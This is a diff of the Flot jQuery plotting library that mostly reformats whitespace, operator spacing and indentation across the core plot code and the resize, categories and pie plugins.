+            top: Math.round(y),
+            left: Math.round(x),
+            'text-align': halign	// In case the text wraps
+        });
+    };
+
+    // Removes one or more text strings from the canvas text overlay.
+    //
+    // If no parameters are given, all text within the layer is removed.
+    //
+    // Note that the text is not immediately removed; it is simply marked as
+    // inactive, which will result in its removal on the next render pass.
+    // This avoids the performance penalty for 'clear and redraw' behavior,
+    // where we potentially get rid of all text on a layer, but will likely
+    // add back most or all of it later, as when redrawing axes, for example.
+    //
+    // @param {string} layer A string of space-separated CSS classes uniquely
+    //     identifying the layer containing this text.
+    // @param {number=} x X coordinate of the text.
+    // @param {number=} y Y coordinate of the text.
+    // @param {string=} text Text string to remove.
+    // @param {(string|object)=} font Either a string of space-separated CSS
+    //     classes or a font-spec object, defining the text's font and style.
+    // @param {number=} angle Angle at which the text is rotated, in degrees.
+    //     Angle is currently unused, it will be implemented in the future.
+
+    Canvas.prototype.removeText = function (layer, x, y, text, font, angle) {
+        if (text == null) {
+            var layerCache = this._textCache[layer];
+            if (layerCache != null) {
+                for (var styleKey in layerCache) {
+                    if (hasOwnProperty.call(layerCache, styleKey)) {
+                        var styleCache = layerCache[styleKey];
+                        for (var key in styleCache) {
+                            if (hasOwnProperty.call(styleCache, key)) {
+                                var positions = styleCache[key].positions;
+                                for (var i = 0, position; position = positions[i]; i++) {
+                                    position.active = false;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        } else {
+            var positions = this.getTextInfo(layer, text, font, angle).positions;
+            for (var i = 0, position; position = positions[i]; i++) {
+                if (position.x == x && position.y == y) {
+                    position.active = false;
+                }
+            }
+        }
+    };
+
+    ///////////////////////////////////////////////////////////////////////////
+    // The top-level container for the entire plot.
 
     function Plot(placeholder, data_, options_, plugins) {
         // data is on the form:
@@ -610,38 +610,38 @@ Licensed under the MIT license.
                     mouseActiveRadius: 10 // how far the mouse can be away to activate an item
                 },
                 interaction: {
-                    redrawOverlayInterval: 1000/60 // time between updates, -1 means in same flow
+                    redrawOverlayInterval: 1000 / 60 // time between updates, -1 means in same flow
                 },
                 hooks: {}
             },
-        surface = null,     // the canvas for the plot itself
-        overlay = null,     // canvas for interactive stuff on top of plot
-        eventHolder = null, // jQuery object that events should be bound to
-        ctx = null, octx = null,
-        xaxes = [], yaxes = [],
-        plotOffset = { left: 0, right: 0, top: 0, bottom: 0},
-        plotWidth = 0, plotHeight = 0,
-        hooks = {
-            processOptions: [],
-            processRawData: [],
-            processDatapoints: [],
-            processOffset: [],
-            drawBackground: [],
-            drawSeries: [],
-            draw: [],
-            bindEvents: [],
-            drawOverlay: [],
-            shutdown: []
-        },
-        plot = this;
+            surface = null,     // the canvas for the plot itself
+            overlay = null,     // canvas for interactive stuff on top of plot
+            eventHolder = null, // jQuery object that events should be bound to
+            ctx = null, octx = null,
+            xaxes = [], yaxes = [],
+            plotOffset = { left: 0, right: 0, top: 0, bottom: 0 },
+            plotWidth = 0, plotHeight = 0,
+            hooks = {
+                processOptions: [],
+                processRawData: [],
+                processDatapoints: [],
+                processOffset: [],
+                drawBackground: [],
+                drawSeries: [],
+                draw: [],
+                bindEvents: [],
+                drawOverlay: [],
+                shutdown: []
+            },
+            plot = this;
 
         // public functions
         plot.setData = setData;
         plot.setupGrid = setupGrid;
         plot.draw = draw;
-        plot.getPlaceholder = function() { return placeholder; };
-        plot.getCanvas = function() { return surface.element; };
-        plot.getPlotOffset = function() { return plotOffset; };
+        plot.getPlaceholder = function () { return placeholder; };
+        plot.getCanvas = function () { return surface.element; };
+        plot.getPlotOffset = function () { return plotOffset; };
         plot.width = function () { return plotWidth; };
         plot.height = function () { return plotHeight; };
         plot.offset = function () {
@@ -667,7 +667,7 @@ Licensed under the MIT license.
         plot.highlight = highlight;
         plot.unhighlight = unhighlight;
         plot.triggerRedrawOverlay = triggerRedrawOverlay;
-        plot.pointOffset = function(point) {
+        plot.pointOffset = function (point) {
             return {
                 left: parseInt(xaxes[axisNumber(point, "x") - 1].p2c(+point.x) + plotOffset.left, 10),
                 top: parseInt(yaxes[axisNumber(point, "y") - 1].p2c(+point.y) + plotOffset.top, 10)
@@ -692,8 +692,8 @@ Licensed under the MIT license.
             plot = null;
         };
         plot.resize = function () {
-        	var width = placeholder.width(),
-        		height = placeholder.height();
+            var width = placeholder.width(),
+                height = placeholder.height();
             surface.resize(width, height);
             overlay.resize(width, height);
         };
@@ -743,7 +743,7 @@ Licensed under the MIT license.
             // not expected behavior; avoid it by replacing them here.
 
             if (opts && opts.colors) {
-            	options.colors = opts.colors;
+                options.colors = opts.colors;
             }
 
             if (options.xaxis.color == null)
@@ -1106,7 +1106,7 @@ Licensed under the MIT license.
                 s = series[i];
                 s.datapoints = { points: [] };
 
-                executeHooks(hooks.processRawData, [ s, s.data, s.datapoints ]);
+                executeHooks(hooks.processRawData, [s, s.data, s.datapoints]);
             }
 
             // first pass: clean and copy data
@@ -1222,7 +1222,7 @@ Licensed under the MIT license.
             for (i = 0; i < series.length; ++i) {
                 s = series[i];
 
-                executeHooks(hooks.processDatapoints, [ s, s.datapoints]);
+                executeHooks(hooks.processDatapoints, [s, s.datapoints]);
             }
 
             // second pass: find datamax/datamin for auto-scaling
@@ -1303,7 +1303,7 @@ Licensed under the MIT license.
             // from a previous plot in this container that we'll try to re-use.
 
             placeholder.css("padding", 0) // padding messes up the positioning
-                .children().filter(function(){
+                .children().filter(function () {
                     return !$(this).hasClass("flot-overlay") && !$(this).hasClass('flot-base');
                 }).remove();
 
@@ -1445,7 +1445,7 @@ Licensed under the MIT license.
 
             // Determine the axis's position in its direction and on its side
 
-            $.each(isXAxis ? xaxes : yaxes, function(i, a) {
+            $.each(isXAxis ? xaxes : yaxes, function (i, a) {
                 if (a && (a.show || a.reserveSpace)) {
                     if (a === axis) {
                         found = true;
@@ -1502,7 +1502,7 @@ Licensed under the MIT license.
                 }
             }
 
-             // save for future reference
+            // save for future reference
             axis.position = pos;
             axis.tickLength = tickLength;
             axis.box.padding = padding;
@@ -1535,7 +1535,7 @@ Licensed under the MIT license.
             if (minMargin == null) {
                 minMargin = 0;
                 for (i = 0; i < series.length; ++i)
-                    minMargin = Math.max(minMargin, 2 * (series[i].points.radius + series[i].points.lineWidth/2));
+                    minMargin = Math.max(minMargin, 2 * (series[i].points.radius + series[i].points.lineWidth / 2));
             }
 
             var margins = {
@@ -1581,7 +1581,7 @@ Licensed under the MIT license.
             // If the grid is visible, add its border width to the offset
 
             for (var a in plotOffset) {
-                if(typeof(options.grid.borderWidth) == "object") {
+                if (typeof (options.grid.borderWidth) == "object") {
                     plotOffset[a] += showGrid ? options.grid.borderWidth[a] : 0;
                 }
                 else {
@@ -1758,21 +1758,21 @@ Licensed under the MIT license.
                     return ticks;
                 };
 
-				axis.tickFormatter = function (value, axis) {
+                axis.tickFormatter = function (value, axis) {
 
-					var factor = axis.tickDecimals ? Math.pow(10, axis.tickDecimals) : 1;
-					var formatted = "" + Math.round(value * factor) / factor;
+                    var factor = axis.tickDecimals ? Math.pow(10, axis.tickDecimals) : 1;
+                    var formatted = "" + Math.round(value * factor) / factor;
 
-					// If tickDecimals was specified, ensure that we have exactly that
-					// much precision; otherwise default to the value's own precision.
+                    // If tickDecimals was specified, ensure that we have exactly that
+                    // much precision; otherwise default to the value's own precision.
 
-					if (axis.tickDecimals != null) {
-						var decimal = formatted.indexOf(".");
-						var precision = decimal == -1 ? 0 : formatted.length - decimal - 1;
-						if (precision < axis.tickDecimals) {
-							return (precision ? formatted : formatted + ".") + ("" + factor).substr(1, axis.tickDecimals - precision);
-						}
-					}
+                    if (axis.tickDecimals != null) {
+                        var decimal = formatted.indexOf(".");
+                        var precision = decimal == -1 ? 0 : formatted.length - decimal - 1;
+                        if (precision < axis.tickDecimals) {
+                            return (precision ? formatted : formatted + ".") + ("" + factor).substr(1, axis.tickDecimals - precision);
+                        }
+                    }
 
                     return formatted;
                 };
@@ -2010,14 +2010,14 @@ Licensed under the MIT license.
                             ctx.lineTo(xrange.to + subPixel, yrange.to);
                         } else {
                             ctx.moveTo(xrange.from, yrange.to + subPixel);
-                            ctx.lineTo(xrange.to, yrange.to + subPixel);                            
+                            ctx.lineTo(xrange.to, yrange.to + subPixel);
                         }
                         ctx.stroke();
                     } else {
                         ctx.fillStyle = m.color || options.grid.markingsColor;
                         ctx.fillRect(xrange.from, yrange.to,
-                                     xrange.to - xrange.from,
-                                     yrange.from - yrange.to);
+                            xrange.to - xrange.from,
+                            yrange.from - yrange.to);
                     }
                 }
             }
@@ -2125,20 +2125,20 @@ Licensed under the MIT license.
                 // If either borderWidth or borderColor is an object, then draw the border
                 // line by line instead of as one rectangle
                 bc = options.grid.borderColor;
-                if(typeof bw == "object" || typeof bc == "object") {
+                if (typeof bw == "object" || typeof bc == "object") {
                     if (typeof bw !== "object") {
-                        bw = {top: bw, right: bw, bottom: bw, left: bw};
+                        bw = { top: bw, right: bw, bottom: bw, left: bw };
                     }
                     if (typeof bc !== "object") {
-                        bc = {top: bc, right: bc, bottom: bc, left: bc};
+                        bc = { top: bc, right: bc, bottom: bc, left: bc };
                     }
 
                     if (bw.top > 0) {
                         ctx.strokeStyle = bc.top;
                         ctx.lineWidth = bw.top;
                         ctx.beginPath();
-                        ctx.moveTo(0 - bw.left, 0 - bw.top/2);
-                        ctx.lineTo(plotWidth, 0 - bw.top/2);
+                        ctx.moveTo(0 - bw.left, 0 - bw.top / 2);
+                        ctx.lineTo(plotWidth, 0 - bw.top / 2);
                         ctx.stroke();
                     }
 
@@ -2164,15 +2164,15 @@ Licensed under the MIT license.
                         ctx.strokeStyle = bc.left;
                         ctx.lineWidth = bw.left;
                         ctx.beginPath();
-                        ctx.moveTo(0 - bw.left/2, plotHeight + bw.bottom);
-                        ctx.lineTo(0- bw.left/2, 0);
+                        ctx.moveTo(0 - bw.left / 2, plotHeight + bw.bottom);
+                        ctx.lineTo(0 - bw.left / 2, 0);
                         ctx.stroke();
                     }
                 }
                 else {
                     ctx.lineWidth = bw;
                     ctx.strokeStyle = options.grid.borderColor;
-                    ctx.strokeRect(-bw/2, -bw/2, plotWidth + bw, plotHeight + bw);
+                    ctx.strokeRect(-bw / 2, -bw / 2, plotWidth + bw, plotHeight + bw);
                 }
             }
 
@@ -2472,10 +2472,10 @@ Licensed under the MIT license.
                 ctx.lineWidth = sw;
                 ctx.strokeStyle = "rgba(0,0,0,0.1)";
                 // position shadow at angle from the mid of line
-                var angle = Math.PI/18;
-                plotLine(series.datapoints, Math.sin(angle) * (lw/2 + sw/2), Math.cos(angle) * (lw/2 + sw/2), series.xaxis, series.yaxis);
-                ctx.lineWidth = sw/2;
-                plotLine(series.datapoints, Math.sin(angle) * (lw/2 + sw/4), Math.cos(angle) * (lw/2 + sw/4), series.xaxis, series.yaxis);
+                var angle = Math.PI / 18;
+                plotLine(series.datapoints, Math.sin(angle) * (lw / 2 + sw / 2), Math.cos(angle) * (lw / 2 + sw / 2), series.xaxis, series.yaxis);
+                ctx.lineWidth = sw / 2;
+                plotLine(series.datapoints, Math.sin(angle) * (lw / 2 + sw / 4), Math.cos(angle) * (lw / 2 + sw / 4), series.xaxis, series.yaxis);
             }
 
             ctx.lineWidth = lw;
@@ -2530,7 +2530,7 @@ Licensed under the MIT license.
             // Doing the conditional here allows the shadow setting to still be 
             // optional even with a lineWidth of 0.
 
-            if( lw == 0 )
+            if (lw == 0)
                 lw = 0.0001;
 
             if (lw > 0 && sw > 0) {
@@ -2538,19 +2538,19 @@ Licensed under the MIT license.
                 var w = sw / 2;
                 ctx.lineWidth = w;
                 ctx.strokeStyle = "rgba(0,0,0,0.1)";
-                plotPoints(series.datapoints, radius, null, w + w/2, true,
-                           series.xaxis, series.yaxis, symbol);
+                plotPoints(series.datapoints, radius, null, w + w / 2, true,
+                    series.xaxis, series.yaxis, symbol);
 
                 ctx.strokeStyle = "rgba(0,0,0,0.2)";
-                plotPoints(series.datapoints, radius, null, w/2, true,
-                           series.xaxis, series.yaxis, symbol);
+                plotPoints(series.datapoints, radius, null, w / 2, true,
+                    series.xaxis, series.yaxis, symbol);
             }
 
             ctx.lineWidth = lw;
             ctx.strokeStyle = series.color;
             plotPoints(series.datapoints, radius,
-                       getFillStyle(series.points, series.color), 0, false,
-                       series.xaxis, series.yaxis, symbol);
+                getFillStyle(series.points, series.color), 0, false,
+                series.xaxis, series.yaxis, symbol);
             ctx.restore();
         }
 
@@ -2745,10 +2745,10 @@ Licensed under the MIT license.
                 if ($.isFunction(options.legend.sorted)) {
                     entries.sort(options.legend.sorted);
                 } else if (options.legend.sorted == "reverse") {
-                	entries.reverse();
+                    entries.reverse();
                 } else {
                     var ascending = options.legend.sorted != "descending";
-                    entries.sort(function(a, b) {
+                    entries.sort(function (a, b) {
                         return a.label == b.label ? 0 : (
                             (a.label < b.label) != ascending ? 1 : -1   // Logical XOR
                         );
@@ -2798,7 +2798,7 @@ Licensed under the MIT license.
                     pos += 'right:' + (m[0] + plotOffset.right) + 'px;';
                 else if (p.charAt(1) == "w")
                     pos += 'left:' + (m[0] + plotOffset.left) + 'px;';
-                var legend = $('<div class="legend">' + table.replace('style="', 'style="position:absolute;' + pos +';') + '</div>').appendTo(placeholder);
+                var legend = $('<div class="legend">' + table.replace('style="', 'style="position:absolute;' + pos + ';') + '</div>').appendTo(placeholder);
                 if (options.legend.backgroundOpacity != 0.0) {
                     // put in the transparent background
                     // separately to avoid blended labels and
@@ -2814,7 +2814,7 @@ Licensed under the MIT license.
                         c = c.toString();
                     }
                     var div = legend.children();
-                    $('<div style="position:absolute;width:' + div.width() + 'px;height:' + div.height() + 'px;' + pos +'background-color:' + c + ';"> </div>').prependTo(legend).css('opacity', options.legend.backgroundOpacity);
+                    $('<div style="position:absolute;width:' + div.width() + 'px;height:' + div.height() + 'px;' + pos + 'background-color:' + c + ';"> </div>').prependTo(legend).css('opacity', options.legend.backgroundOpacity);
                 }
             }
         }
@@ -2904,10 +2904,10 @@ Licensed under the MIT license.
                         // for a bar graph, the cursor must be inside the bar
                         if (series[i].bars.horizontal ?
                             (mx <= Math.max(b, x) && mx >= Math.min(b, x) &&
-                             my >= y + barLeft && my <= y + barRight) :
+                                my >= y + barLeft && my <= y + barRight) :
                             (mx >= x + barLeft && mx <= x + barRight &&
-                             my >= Math.min(b, y) && my <= Math.max(b, y)))
-                                item = [i, j / ps];
+                                my >= Math.min(b, y) && my <= Math.max(b, y)))
+                            item = [i, j / ps];
                     }
                 }
             }
@@ -2917,10 +2917,12 @@ Licensed under the MIT license.
                 j = item[1];
                 ps = series[i].datapoints.pointsize;
 
-                return { datapoint: series[i].datapoints.points.slice(j * ps, (j + 1) * ps),
-                         dataIndex: j,
-                         series: series[i],
-                         seriesIndex: i };
+                return {
+                    datapoint: series[i].datapoints.points.slice(j * ps, (j + 1) * ps),
+                    dataIndex: j,
+                    series: series[i],
+                    seriesIndex: i
+                };
             }
 
             return null;
@@ -2929,18 +2931,18 @@ Licensed under the MIT license.
         function onMouseMove(e) {
             if (options.grid.hoverable)
                 triggerClickHoverEvent("plothover", e,
-                                       function (s) { return s["hoverable"] != false; });
+                    function (s) { return s["hoverable"] != false; });
         }
 
         function onMouseLeave(e) {
             if (options.grid.hoverable)
                 triggerClickHoverEvent("plothover", e,
-                                       function (s) { return false; });
+                    function (s) { return false; });
         }
 
         function onClick(e) {
             triggerClickHoverEvent("plotclick", e,
-                                   function (s) { return s["clickable"] != false; });
+                function (s) { return s["clickable"] != false; });
         }
 
         // trigger click or hover event (they send the same parameters
@@ -2949,7 +2951,7 @@ Licensed under the MIT license.
             var offset = eventHolder.offset(),
                 canvasX = event.pageX - offset.left - plotOffset.left,
                 canvasY = event.pageY - offset.top - plotOffset.top,
-            pos = canvasToAxisCoords({ left: canvasX, top: canvasY });
+                pos = canvasToAxisCoords({ left: canvasX, top: canvasY });
 
             pos.pageX = event.pageX;
             pos.pageY = event.pageY;
@@ -2968,8 +2970,8 @@ Licensed under the MIT license.
                     var h = highlights[i];
                     if (h.auto == eventname &&
                         !(item && h.series == item.series &&
-                          h.point[0] == item.datapoint[0] &&
-                          h.point[1] == item.datapoint[1]))
+                            h.point[0] == item.datapoint[0] &&
+                            h.point[1] == item.datapoint[1]))
                         unhighlight(h.series, h.point);
                 }
 
@@ -2977,7 +2979,7 @@ Licensed under the MIT license.
                     highlight(item.series, item.datapoint, eventname);
             }
 
-            placeholder.trigger(eventname, [ pos, item ]);
+            placeholder.trigger(eventname, [pos, item]);
         }
 
         function triggerRedrawOverlay() {
@@ -3109,7 +3111,7 @@ Licensed under the MIT license.
             octx.strokeStyle = highlightColor;
 
             drawBar(point[0], point[1], point[2] || 0, barLeft, barLeft + series.bars.barWidth,
-                    function () { return fillStyle; }, series.xaxis, series.yaxis, octx, series.bars.horizontal, series.bars.lineWidth);
+                function () { return fillStyle; }, series.xaxis, series.yaxis, octx, series.bars.horizontal, series.bars.lineWidth);
         }
 
         function getColorOrGradient(spec, bottom, top, defaultColor) {
@@ -3141,7 +3143,7 @@ Licensed under the MIT license.
 
     // Add the plot function to the top level of the jQuery object
 
-    $.plot = function(placeholder, data, options) {
+    $.plot = function (placeholder, data, options) {
         //var t0 = new Date();
         var plot = new Plot($(placeholder), data, options, $.plot.plugins);
         //(window.console ? console.log : alert)("time used (msecs): " + ((new Date()).getTime() - t0.getTime()));
@@ -3154,8 +3156,8 @@ Licensed under the MIT license.
 
     // Also add the plot function as a chainable property
 
-    $.fn.plot = function(data, options) {
-        return this.each(function() {
+    $.fn.plot = function (data, options) {
+        return this.each(function () {
             $.plot(this, data, options);
         });
     };
@@ -3182,16 +3184,16 @@ can just fix the size of their placeholders.
 
 /* Inline dependency:
  * jQuery resize event - v1.1 - 3/14/2010
- * http://benalman.com/projects/jquery-resize-plugin/
+ * https://benalman.com/projects/jquery-resize-plugin/
  *
  * Copyright (c) 2010 "Cowboy" Ben Alman
  * Dual licensed under the MIT and GPL licenses.
- * http://benalman.com/about/license/
+ * https://benalman.com/about/license/
  */
-(function($,e,t){"$:nomunge";var i=[],n=$.resize=$.extend($.resize,{}),a,r=false,s="setTimeout",u="resize",m=u+"-special-event",o="pendingDelay",l="activeDelay",f="throttleWindow";n[o]=200;n[l]=20;n[f]=true;$.event.special[u]={setup:function(){if(!n[f]&&this[s]){return false}var e=$(this);i.push(this);e.data(m,{w:e.width(),h:e.height()});if(i.length===1){a=t;h()}},teardown:function(){if(!n[f]&&this[s]){return false}var e=$(this);for(var t=i.length-1;t>=0;t--){if(i[t]==this){i.splice(t,1);break}}e.removeData(m);if(!i.length){if(r){cancelAnimationFrame(a)}else{clearTimeout(a)}a=null}},add:function(e){if(!n[f]&&this[s]){return false}var i;function a(e,n,a){var r=$(this),s=r.data(m)||{};s.w=n!==t?n:r.width();s.h=a!==t?a:r.height();i.apply(this,arguments)}if($.isFunction(e)){i=e;return a}else{i=e.handler;e.handler=a}}};function h(t){if(r===true){r=t||1}for(var s=i.length-1;s>=0;s--){var l=$(i[s]);if(l[0]==e||l.is(":visible")){var f=l.width(),c=l.height(),d=l.data(m);if(d&&(f!==d.w||c!==d.h)){l.trigger(u,[d.w=f,d.h=c]);r=t||true}}else{d=l.data(m);d.w=0;d.h=0}}if(a!==null){if(r&&(t==null||t-r<1e3)){a=e.requestAnimationFrame(h)}else{a=setTimeout(h,n[o]);r=false}}}if(!e.requestAnimationFrame){e.requestAnimationFrame=function(){return e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(t,i){return e.setTimeout(function(){t((new Date).getTime())},n[l])}}()}if(!e.cancelAnimationFrame){e.cancelAnimationFrame=function(){return e.webkitCancelRequestAnimationFrame||e.mozCancelRequestAnimationFrame||e.oCancelRequestAnimationFrame||e.msCancelRequestAnimationFrame||clearTimeout}()}})(jQuery,this);
+(function ($, e, t) { "$:nomunge"; var i = [], n = $.resize = $.extend($.resize, {}), a, r = false, s = "setTimeout", u = "resize", m = u + "-special-event", o = "pendingDelay", l = "activeDelay", f = "throttleWindow"; n[o] = 200; n[l] = 20; n[f] = true; $.event.special[u] = { setup: function () { if (!n[f] && this[s]) { return false } var e = $(this); i.push(this); e.data(m, { w: e.width(), h: e.height() }); if (i.length === 1) { a = t; h() } }, teardown: function () { if (!n[f] && this[s]) { return false } var e = $(this); for (var t = i.length - 1; t >= 0; t--) { if (i[t] == this) { i.splice(t, 1); break } } e.removeData(m); if (!i.length) { if (r) { cancelAnimationFrame(a) } else { clearTimeout(a) } a = null } }, add: function (e) { if (!n[f] && this[s]) { return false } var i; function a(e, n, a) { var r = $(this), s = r.data(m) || {}; s.w = n !== t ? n : r.width(); s.h = a !== t ? a : r.height(); i.apply(this, arguments) } if ($.isFunction(e)) { i = e; return a } else { i = e.handler; e.handler = a } } }; function h(t) { if (r === true) { r = t || 1 } for (var s = i.length - 1; s >= 0; s--) { var l = $(i[s]); if (l[0] == e || l.is(":visible")) { var f = l.width(), c = l.height(), d = l.data(m); if (d && (f !== d.w || c !== d.h)) { l.trigger(u, [d.w = f, d.h = c]); r = t || true } } else { d = l.data(m); d.w = 0; d.h = 0 } } if (a !== null) { if (r && (t == null || t - r < 1e3)) { a = e.requestAnimationFrame(h) } else { a = setTimeout(h, n[o]); r = false } } } if (!e.requestAnimationFrame) { e.requestAnimationFrame = function () { return e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (t, i) { return e.setTimeout(function () { t((new Date).getTime()) }, n[l]) } }() } if (!e.cancelAnimationFrame) { e.cancelAnimationFrame = function () { return e.webkitCancelRequestAnimationFrame || e.mozCancelRequestAnimationFrame || e.oCancelRequestAnimationFrame || e.msCancelRequestAnimationFrame || clearTimeout }() } })(jQuery, this);
 
 (function ($) {
-    var options = { }; // no options
+    var options = {}; // no options
 
     function init(plot) {
         function onResize() {
@@ -3206,7 +3208,7 @@ can just fix the size of their placeholders.
             plot.setupGrid();
             plot.draw();
         }
-        
+
         function bindEvents(plot, eventHolder) {
             plot.getPlaceholder().resize(onResize);
         }
@@ -3214,11 +3216,11 @@ can just fix the size of their placeholders.
         function shutdown(plot, eventHolder) {
             plot.getPlaceholder().unbind("resize", onResize);
         }
-        
+
         plot.hooks.bindEvents.push(bindEvents);
         plot.hooks.shutdown.push(shutdown);
     }
-    
+
     $.plot.plugins.push({
         init: init,
         options: options,
@@ -3238,24 +3240,24 @@ allows you to plot such a dataset directly.
 To enable it, you must specify mode: "categories" on the axis with the textual
 labels, e.g.
 
-	$.plot("#placeholder", data, { xaxis: { mode: "categories" } });
+    $.plot("#placeholder", data, { xaxis: { mode: "categories" } });
 
 By default, the labels are ordered as they are met in the data series. If you
 need a different ordering, you can specify "categories" on the axis options
 and list the categories there:
 
-	xaxis: {
-		mode: "categories",
-		categories: ["February", "March", "April"]
-	}
+    xaxis: {
+        mode: "categories",
+        categories: ["February", "March", "April"]
+    }
 
 If you need to customize the distances between the categories, you can specify
 "categories" as an object mapping labels to values
 
-	xaxis: {
-		mode: "categories",
-		categories: { "February": 1, "March": 3, "April": 4 }
-	}
+    xaxis: {
+        mode: "categories",
+        categories: { "February": 1, "March": 3, "April": 4 }
+    }
 
 If you don't specify all categories, the remaining categories will be numbered
 from the max value plus 1 (with a spacing of 1 between each).
@@ -3281,7 +3283,7 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
             categories: null
         }
     };
-    
+
     function processRawData(plot, series, data, datapoints) {
         // if categories are enabled, we need to disable
         // auto-transformation to numbers so the strings are intact
@@ -3289,7 +3291,7 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
 
         var xCategories = series.xaxis.options.mode == "categories",
             yCategories = series.yaxis.options.mode == "categories";
-        
+
         if (!(xCategories || yCategories))
             return;
 
@@ -3310,14 +3312,14 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
                     format[format.length - 1].x = true;
                 }
             }
-            
+
             datapoints.format = format;
         }
 
         for (var m = 0; m < format.length; ++m) {
             if (format[m].x && xCategories)
                 format[m].number = false;
-            
+
             if (format[m].y && yCategories)
                 format[m].number = false;
         }
@@ -3325,7 +3327,7 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
 
     function getNextIndex(categories) {
         var index = -1;
-        
+
         for (var v in categories)
             if (categories[v] > index)
                 index = categories[v];
@@ -3345,11 +3347,11 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
 
         return res;
     }
-    
+
     function setupCategoriesForAxis(series, axis, datapoints) {
         if (series[axis].options.mode != "categories")
             return;
-        
+
         if (!series[axis].categories) {
             // parse options
             var c = {}, o = series[axis].options.categories || {};
@@ -3361,7 +3363,7 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
                 for (var v in o)
                     c[v] = o[v];
             }
-            
+
             series[axis].categories = c;
         }
 
@@ -3371,7 +3373,7 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
 
         transformPointsOnAxis(datapoints, axis, series[axis].categories);
     }
-    
+
     function transformPointsOnAxis(datapoints, axis, categories) {
         // go through the points, transforming them
         var points = datapoints.points,
@@ -3383,7 +3385,7 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
         for (var i = 0; i < points.length; i += ps) {
             if (points[i] == null)
                 continue;
-            
+
             for (var m = 0; m < ps; ++m) {
                 var val = points[i + m];
 
@@ -3394,7 +3396,7 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
                     categories[val] = index;
                     ++index;
                 }
-                
+
                 points[i + m] = categories[val];
             }
         }
@@ -3409,7 +3411,7 @@ as "categories" on the axis object, e.g. plot.getAxes().xaxis.categories.
         plot.hooks.processRawData.push(processRawData);
         plot.hooks.processDatapoints.push(processDatapoints);
     }
-    
+
     $.plot.plugins.push({
         init: init,
         options: options,
@@ -3435,807 +3437,807 @@ percentages internally.
 
 The plugin supports these options:
 
-	series: {
-		pie: {
-			show: true/false
-			radius: 0-1 for percentage of fullsize, or a specified pixel length, or 'auto'
-			innerRadius: 0-1 for percentage of fullsize or a specified pixel length, for creating a donut effect
-			startAngle: 0-2 factor of PI used for starting angle (in radians) i.e 3/2 starts at the top, 0 and 2 have the same result
-			tilt: 0-1 for percentage to tilt the pie, where 1 is no tilt, and 0 is completely flat (nothing will show)
-			offset: {
-				top: integer value to move the pie up or down
-				left: integer value to move the pie left or right, or 'auto'
-			},
-			stroke: {
-				color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#FFF')
-				width: integer pixel width of the stroke
-			},
-			label: {
-				show: true/false, or 'auto'
-				formatter:  a user-defined function that modifies the text/style of the label text
-				radius: 0-1 for percentage of fullsize, or a specified pixel length
-				background: {
-					color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#000')
-					opacity: 0-1
-				},
-				threshold: 0-1 for the percentage value at which to hide labels (if they're too small)
-			},
-			combine: {
-				threshold: 0-1 for the percentage value at which to combine slices (if they're too small)
-				color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#CCC'), if null, the plugin will automatically use the color of the first slice to be combined
-				label: any text value of what the combined slice should be labeled
-			}
-			highlight: {
-				opacity: 0-1
-			}
-		}
-	}
+    series: {
+        pie: {
+            show: true/false
+            radius: 0-1 for percentage of fullsize, or a specified pixel length, or 'auto'
+            innerRadius: 0-1 for percentage of fullsize or a specified pixel length, for creating a donut effect
+            startAngle: 0-2 factor of PI used for starting angle (in radians) i.e 3/2 starts at the top, 0 and 2 have the same result
+            tilt: 0-1 for percentage to tilt the pie, where 1 is no tilt, and 0 is completely flat (nothing will show)
+            offset: {
+                top: integer value to move the pie up or down
+                left: integer value to move the pie left or right, or 'auto'
+            },
+            stroke: {
+                color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#FFF')
+                width: integer pixel width of the stroke
+            },
+            label: {
+                show: true/false, or 'auto'
+                formatter:  a user-defined function that modifies the text/style of the label text
+                radius: 0-1 for percentage of fullsize, or a specified pixel length
+                background: {
+                    color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#000')
+                    opacity: 0-1
+                },
+                threshold: 0-1 for the percentage value at which to hide labels (if they're too small)
+            },
+            combine: {
+                threshold: 0-1 for the percentage value at which to combine slices (if they're too small)
+                color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#CCC'), if null, the plugin will automatically use the color of the first slice to be combined
+                label: any text value of what the combined slice should be labeled
+            }
+            highlight: {
+                opacity: 0-1
+            }
+        }
+    }
 
 More detail and specific examples can be found in the included HTML file.
 
 */
 
-(function($) {
+(function ($) {
 
-	// Maximum redraw attempts when fitting labels within the plot
+    // Maximum redraw attempts when fitting labels within the plot
 
-	var REDRAW_ATTEMPTS = 10;
+    var REDRAW_ATTEMPTS = 10;
 
-	// Factor by which to shrink the pie when fitting labels within the plot
+    // Factor by which to shrink the pie when fitting labels within the plot
 
-	var REDRAW_SHRINK = 0.95;
+    var REDRAW_SHRINK = 0.95;
 
-	function init(plot) {
+    function init(plot) {
 
-		var canvas = null,
-			target = null,
-			options = null,
-			maxRadius = null,
-			centerLeft = null,
-			centerTop = null,
-			processed = false,
-			ctx = null;
+        var canvas = null,
+            target = null,
+            options = null,
+            maxRadius = null,
+            centerLeft = null,
+            centerTop = null,
+            processed = false,
+            ctx = null;
 
-		// interactive variables
+        // interactive variables
 
-		var highlights = [];
+        var highlights = [];
 
-		// add hook to determine if pie plugin in enabled, and then perform necessary operations
+        // add hook to determine if pie plugin in enabled, and then perform necessary operations
 
-		plot.hooks.processOptions.push(function(plot, options) {
-			if (options.series.pie.show) {
+        plot.hooks.processOptions.push(function (plot, options) {
+            if (options.series.pie.show) {
 
-				options.grid.show = false;
+                options.grid.show = false;
 
-				// set labels.show
+                // set labels.show
 
